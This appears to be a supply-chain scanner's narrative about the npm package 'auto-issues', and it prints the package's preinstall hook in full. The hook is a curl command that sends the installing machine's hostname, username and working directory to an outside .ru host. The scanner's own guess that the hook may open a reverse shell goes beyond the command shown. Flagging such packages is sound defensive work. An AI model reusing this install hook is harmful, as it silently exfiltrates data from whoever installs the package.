chain_analysis.chain_narrative: The package 'auto-issues' version 1.18.2 contains no JavaScript files but an install hook present that may execute at install time via the commands listed in the package metadata. The install hook command is `preinstall:curl -H"Package:auto-issues" -H"Version:1.18.2" -H"Hostname:$(hostname|base64)" -H"Whoami:$(whoami|base64)" -H"Pwd:$(pwd|base64)" -d"meow!securitytest" http://npm_new.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"`. This behavior may indicate a potential attack chain where the package is being installed on a compromised system and the install hook is used to exfiltrate data or execute a reverse shell.
